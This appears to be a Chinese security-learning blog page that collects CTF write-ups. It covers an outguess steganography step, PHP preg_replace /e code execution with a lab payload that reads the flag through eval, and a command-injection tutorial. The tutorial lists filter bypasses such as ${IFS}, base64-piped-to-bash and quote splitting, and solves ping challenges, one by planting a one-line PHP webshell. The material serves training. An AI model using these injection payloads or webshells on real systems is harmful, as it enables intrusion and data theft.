<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 89504E -r flag.jpg -t 1.txt</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>  <img src="https://note.youdao.com/yws/api/personal/file/WEBf729302eaa9226eefa7368d8124e834d?method=download&shareKey=1d41e21e488ba2aac1f5a42676ee54dd"></p>
<p>  <img src="https://note.youdao.com/yws/api/personal/file/WEBc39202ad7e539bfcc22e83ae6fe2afe1?method=download&shareKey=5a2dc253c344cfdcb97d742ec8bd6218"></p>
<ul>
<li><p>解码后是一串十六进制数，再将十六进制数转换为字符串，发现有flag文件。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBbd04ef4167cd5425f5db4fb6c703f90b?method=download&shareKey=005121d5c948063df662ae362630f587"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe8f8971889c222a0dfa32db35613266c?method=download&shareKey=4c7b94bd274c60efdbdce6cb0f159815"></p>
</li>
<li><p>最后把这串十六进制数放进winhex。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB83adebdf25a5b869893c5ed876ae6c04?method=download&shareKey=a2a89b0410431e46e54d1d43abf2bee9"></p>
</li>
<li><p>用压缩包形式打开，得到flag。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB55357095f9d77d539e886a6cc7917b18?method=download&shareKey=14ffa922f9e8a21d4948cfdf66a3a325"></p>
</li>
</ul>
<h2 id="雾都孤儿"><a href="#雾都孤儿" class="headerlink" title="雾都孤儿"></a>雾都孤儿</h2><p>还在学习中，果然misc要学的东西又多又杂</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/28/preg-replace-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">preg_replace()代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-28</time><div class="content"><h1 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h1><p>先看一下php对preg_replace() 函数定义</p>
<blockquote>
<p> preg_replace — 执行一个正则表达式的搜索和替换 </p>
</blockquote>
<p>preg_replace在ctf中非常常见，其主要通过正则匹配用于对字符串的过滤，从而实现保护。</p>
<blockquote>
<p>preg_replace ( <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$pattern</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$replacement</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$subject</code> , int <code>$limit</code> = -1 , int <code>&amp;$count</code> = ? ) : <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> </p>
<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。 </p>
</blockquote>
<p>先看一下官方例子</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>这个例子就是通过<code>/(\w+) (\d+), (\d+)/i</code>这个正则表达式匹配<code>$string</code>,从而实现替换。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">&#x27;April 15, 2003&#x27;</span>;</span><br><span class="line">$pattern = <span class="string">&#x27;/(\w+) (\d+), (\d+)/i&#x27;</span>;</span><br><span class="line">$replacement = <span class="string">&#x27;$&#123;1&#125;1,$3&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace($pattern, $replacement, $string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过改变<code>replacement</code>实现对<code>$string</code>的不同替换</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5b2b27a6721fcb0e7017a13885b5923a?method=download&shareKey=dbe48fbaebd489b983944576b8275ed7"></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p> preg_replace()中使用基于索引的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">&#x27;The quick brown fox jumps over the lazy dog.&#x27;</span>;</span><br><span class="line">$patterns = <span class="keyword">array</span>();</span><br><span class="line">$patterns[<span class="number">0</span>] = <span class="string">&#x27;/quick/&#x27;</span>;</span><br><span class="line">$patterns[<span class="number">1</span>] = <span class="string">&#x27;/brown/&#x27;</span>;</span><br><span class="line">$patterns[<span class="number">2</span>] = <span class="string">&#x27;/fox/&#x27;</span>;</span><br><span class="line">$replacements = <span class="keyword">array</span>();</span><br><span class="line">$replacements[<span class="number">2</span>] = <span class="string">&#x27;bear&#x27;</span>;</span><br><span class="line">$replacements[<span class="number">1</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">$replacements[<span class="number">0</span>] = <span class="string">&#x27;slow&#x27;</span>;</span><br><span class="line">ksort($patterns);</span><br><span class="line">ksort($replacements);</span><br><span class="line"><span class="keyword">echo</span> preg_replace($patterns, $replacements, $string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc3cdc2407f0985b88b85f6f1a4f8462a?method=download&shareKey=81e22a0941276b8d23bd4b13d2a5ba2d"></p>
<p>其中<code>ksort()</code>函数是对数组进行升序排序，若未进行排序，则如下图所示</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9f8bde0c8edd6880cc2abfd3fc3f205d?method=download&shareKey=c173737b1f0fa1cfb5a19b02d870ba49"></p>
<p>**ps.**使用<code>asort</code>进行降序排序。</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p> 剥离多余的空白字符 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">&#x27;foo   o&#x27;</span>;</span><br><span class="line">$str = preg_replace(<span class="string">&#x27;/\s\s+/&#x27;</span>, <span class="string">&#x27; &#x27;</span>, $str);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过<code>/\s\s+/</code>匹配空白符替换成一个空白符。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb7c9ee1cb08d6d30e7a0537b030f0962?method=download&shareKey=a4e839d8ac5e99632b205d14b8f497fa"></p>
<h2 id="部分正则表达式"><a href="#部分正则表达式" class="headerlink" title="部分正则表达式"></a>部分正则表达式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\w 匹配字母或数字或下划线或汉字 即&#39;[^A-Za-z0-9_]&#39;</span><br><span class="line"></span><br><span class="line">\s 匹配任意的空白符</span><br><span class="line"></span><br><span class="line">\d 匹配数字</span><br><span class="line"></span><br><span class="line">\b 匹配单词的开始或结束</span><br></pre></td></tr></table></figure>

<p>这里提供一个脚本，可以跑出不被正则匹配的字符。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow = [];</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">255</span>; $i++)&#123;</span><br><span class="line">    $string =chr($i);</span><br><span class="line">    <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>, $string))&#123;</span><br><span class="line">        $allow[$i]=$string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($allow);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace()代码执行"></a>preg_replace()代码执行</h1><p>preg_replace()作为常见的函数，有一个非常典型的漏洞，那就是 preg_replace /e 模式下的代码执行问题 ，首先先了解一下什么是<code>/e</code></p>
<h2 id="模式修饰符"><a href="#模式修饰符" class="headerlink" title="模式修饰符"></a>模式修饰符</h2><blockquote>
<p><em>i</em> (<code>PCRE_CASELESS</code>)</p>
<p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p>
<p><em>m</em> (<code>PCRE_MULTILINE</code>)</p>
<p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</p>
<p><em>s</em> (<code>PCRE_DOTALL</code>)</p>
<p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的/s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</p>
<p><em>x</em> (<code>PCRE_EXTENDED</code>)</p>
<p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 /x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。</p>
</blockquote>
<p>而官方已经弃用<code>/e</code></p>
<blockquote>
<p>如果设置了这个被弃用的修饰符， <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(<code>\</code>)和 NULL 字符在 后向引用替换时会被用反斜线转义. </p>
</blockquote>
<p>为防止出现代码执行攻击，可采用<code>preg_replace_callback()  </code>替代</p>
<h2 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace /e"></a>preg_replace /e</h2><p>使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>, <span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的命令执行，相当于 eval(‘strtolower(“\1”);’) 结果 ,而\1实际则为第一个匹配项，那么就等于执行了phpinfo()。 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果 </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB917f664b0541d80ab5a84e938b1fae3b?method=download&shareKey=0f5e66b41f4c0ad1f663a944fbecab2f"></p>
<h2 id="靶机分析"><a href="#靶机分析" class="headerlink" title="靶机分析"></a>靶机分析</h2><ul>
<li><p>直接给出源码,<code>file_get_contents</code>需全等于<code>ohhhhhhhhhhhhh</code>同时读ohhh.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;contents&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;ohhhhhhhhhhhhh&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h4&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h4&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONONO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//ohhh.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>用data://和php://伪协议绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contents&#x3D;data:text&#x2F;plain;base64,b2hoaGhoaGhoaGhoaGg&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ohhh.php</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf6c0a88ee51e9180956d2f651e391f71?method=download&shareKey=3276110a6f0fa571cc0a69c449bc42f4"></p>
</li>
<li><p>base64解码后即为ohhh.php源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB549c53f048baefbb5343e5d81b582040?method=download&shareKey=98773d41a7a776f8d82604d7c6187ede"></p>
</li>
<li><p>这里需要调用<code>getFlag()</code>函数来读flag，即利用preg_replace /e漏洞进行代码执行</p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;var&#x2F;tmp&#x2F;flag%27);</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB46823b2daf9f0cb7287796f11226cc44?method=download&shareKey=dbd804e7c99bed316d1b6ff192211a39"></p>
</li>
</ul>
<p>资料引用</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php">https://www.php.net/manual/zh/function.preg-replace.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php</a></p>
</blockquote>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">命令执行漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-27</time><div class="content"><p> <strong>命令执行（Command Execution）</strong>漏洞是指由于web服务器存在安全漏洞，使恶意代码被执行，导致信息泄露或shell权限被拿下，可以发生在web的各种组件，大多是对输入命令安全检测不足导致。</p>
<h1 id="系统命令执行漏洞"><a href="#系统命令执行漏洞" class="headerlink" title="系统命令执行漏洞"></a>系统命令执行漏洞</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<p>以上为常用于执行系统命令的函数，多用于执行ping的网页，通常在利用时会用到管道符。</p>
<h2 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h2><h3 id="windows系统支持的管道符"><a href="#windows系统支持的管道符" class="headerlink" title="windows系统支持的管道符"></a>windows系统支持的管道符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;|&quot;直接执行后面的语句</span><br><span class="line">&quot;||&quot;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&quot;&amp;&quot;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&quot;&amp;&amp;&quot;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>

<h3 id="Linux系统支持的管道符"><a href="#Linux系统支持的管道符" class="headerlink" title="Linux系统支持的管道符"></a>Linux系统支持的管道符</h3><p>与windows系统基本一致，多了一个<code>；</code>，用法同<code>&amp;</code>。</p>
<h2 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>这是最常见的限制，也是最容易绕过的限制。</p>
<ul>
<li><p>${IFS}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">cat$&#123;IFS&#125;flag</span><br><span class="line">cat$&#123;IFS&#125;$1flag</span><br><span class="line">cat$IFS$1flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>&lt;&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>%09</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">cat%09flag</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul>
<li><p>拼接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash   Y2F0IGZsYWc&#x3D;即为</span><br><span class="line">Y2F0IGZsYWc&#x3D;即为&quot;cat flag&quot;base64编码</span><br></pre></td></tr></table></figure>
</li>
<li><p>引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at fl&#39;&#39;ag</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>反斜线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br><span class="line">cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="绕过前缀限制"><a href="#绕过前缀限制" class="headerlink" title="绕过前缀限制"></a>绕过前缀限制</h3><p>用分号和管道符绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls;cat &#x2F;flag</span><br><span class="line">ls&amp;&amp;cat &#x2F;flag</span><br><span class="line">ls&amp;cat &#x2F;flag</span><br><span class="line">ls|cat &#x2F;flag</span><br><span class="line">ls||cat &#x2F;flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="读文件绕过"><a href="#读文件绕过" class="headerlink" title="读文件绕过"></a>读文件绕过</h3><p>cat被过滤用一下命令代替</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><p>通过<code>&gt;</code>将命令输入文件名中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat zbc.txt</span><br><span class="line">echo &quot;520&quot;&gt;zbc.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ping1"><a href="#ping1" class="headerlink" title="ping1"></a>ping1</h3><ul>
<li><p>首先看一下文件列表</p>
<p><code>127.0.0.1|ls</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa1eba71c8713ee2b70604b32dbfa170d?method=download&shareKey=6e605a8682108dc1ab8c436fdf850d60"></p>
</li>
<li><p>直接写一个一句话木马传进去试试，记得在<code>$</code>前加上转义字符</p>
</li>
</ul>
<p>``127.0.0.1|echo “<?php @eval(\$_POST[cmd]);?>“&gt;shell.php`</p>
<ul>
<li><p>写入成功，用蚁剑读flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB04b374b8b2375a0b69575cb7fc9e46b2?method=download&shareKey=6a35ca8eb03b89bc5573b8f8ecd1f99e"></p>
</li>
</ul>
<h3 id="ping2"><a href="#ping2" class="headerlink" title="ping2"></a>ping2</h3><ul>
<li><p>先找一下flag</p>
<p><code>127.0.0.1|find / -name &quot;flag&quot;</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcfcbe1df17c099e201e94e929e492fcd?method=download&shareKey=eb7ffb43ef8a04fd24376962371cad47"></p>
</li>
<li><p>读flag</p>
<p><code> 127.0.0.1|cat /tmp/flag</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5c0aa26e308726cbcf4370410601c7bd?method=download&shareKey=1fc85dafc5603433410e2d7569f57026"></p>
</li>
</ul>
<h3 id="ping3"><a href="#ping3" class="headerlink" title="ping3"></a>ping3</h3><ul>
<li><p>同样找flag，发现空格被过滤，用<code>$IFS$9</code>绕过</p>
<p><code>127.0.0.1&amp;&amp;find$IFS$9/$IFS$9-name$IFS$9&quot;flag&quot;</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB78c8ed2ef9c1460469bea1954f6bc6e9?method=download&shareKey=bad786447fad986f71855d394b358e4b"></p>
</li>
<li><p>绕过空格发现对flag进行保护，再绕找到flag</p>
<p><code>127.0.0.1&amp;&amp;find$IFS$9/$IFS$9-name$IFS$9&quot;fla&quot;&quot;g&quot;</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe6fdf5ee65d73a09b9e6e5f57738f5cf?method=download&shareKey=fdb63644ac7c68d948b6182b2fa7f1a3"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB15d502c93f4941aa58957fcacb391061?method=download&shareKey=2c6a44a2839999a28d307a48b2d7ba67"></p>
</li>
<li><p>最后读flag</p>
<p><code>127.0.0.1&amp;&amp;cat%09/fla&quot;&quot;g</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBbaf1c844fe3c75579a971a8f693cd8e4?method=download&shareKey=7c7e4ca4f072c7de20aaf42fb9cae525"></p>
</li>
</ul>
<h3 id="ping4"><a href="#ping4" class="headerlink" title="ping4"></a>ping4</h3><ul>
<li><p>同样看列表，发现<code>ls</code>不行，换<code>dir</code>试下读到flag</p>
<p><code>127.0.0.1&amp;&amp;dir</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBabaf9e543dea0d362bf802222f756291?method=download&shareKey=c78f35b47c72a5b504eecedfa8a0af08"></p>
</li>
<li><p><code>.bak</code>是备份文件，下载发现是源码</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3dbeab12d4ef868e2623b8c45bee553b?method=download&shareKey=effa52c0ebde61cde90d6fcb8491089b"></p>
</li>
<li><p>过滤了很多东西，用<code>\</code>绕过过滤读到flag</p>
<p><code> 127.0.0.1&amp;&amp;c\a\t /flag</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB095d51ce4c4ee6e6cc72b10d944f4681?method=download&shareKey=e997e6fcd994fc12199c917cec90bc8e"></p>
</li>
</ul>
